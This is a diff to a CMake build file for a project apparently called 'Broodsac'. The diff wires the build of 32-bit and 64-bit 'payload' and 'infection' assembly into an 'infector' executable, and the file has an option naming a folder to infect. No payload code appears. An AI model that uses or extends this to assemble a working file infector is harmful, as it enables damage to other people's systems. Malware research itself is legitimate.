@@ -5,13 +5,27 @@ set(CMAKE_MSVC_RUNTIME_LIBRARY "MultiThreaded$<$<CONFIG:Debug>:Debug>")
 option(BROODSAC_DEBUG "Turn on debugging for Broodsac" OFF)
 set(BROODSAC_INFECTABLES "" CACHE STRING "Set the folder for Broodsac to infect, only relevant with BROODSAC_DEBUG")
 
+include(ExternalProject)
+ExternalProject_Add(payload_32_builder
+  SOURCE_DIR "${CMAKE_CURRENT_SOURCE_DIR}/../infection/asm/32"
+  BINARY_DIR "${CMAKE_CURRENT_BINARY_DIR}/$<CONFIG>/infection/32"
+  CMAKE_ARGS
+  -A Win32)
+ExternalProject_Add(payload_64_builder
+  SOURCE_DIR "${CMAKE_CURRENT_SOURCE_DIR}/../infection/asm/64"
+  BINARY_DIR "${CMAKE_CURRENT_BINARY_DIR}/$<CONFIG>/infection/64"
+  CMAKE_ARGS
+  -A x64)
+
 add_executable(infector main.c)
+add_dependencies(infector payload_32_builder payload_64_builder)
 add_custom_command(TARGET infector
   PRE_BUILD
   COMMAND ${CMAKE_ASM_NASM_COMPILER} ARGS
   -f bin
   -o "${CMAKE_CURRENT_BINARY_DIR}/$<CONFIG>/infection32.bin"
   -D TLS
+  -I "${CMAKE_CURRENT_BINARY_DIR}/$<CONFIG>/infection/32"
   "${CMAKE_CURRENT_SOURCE_DIR}/../infection/asm/32/main.asm")
 add_custom_command(TARGET infector
   PRE_BUILD
@@ -19,6 +33,7 @@ add_custom_command(TARGET infector
   -f bin
   -o "${CMAKE_CURRENT_BINARY_DIR}/$<CONFIG>/infection64.bin"
   -D TLS
+  -I "${CMAKE_CURRENT_BINARY_DIR}/$<CONFIG>/infection/64"
   "${CMAKE_CURRENT_SOURCE_DIR}/../infection/asm/64/main.asm")
 add_custom_command(TARGET infector
   PRE_BUILD
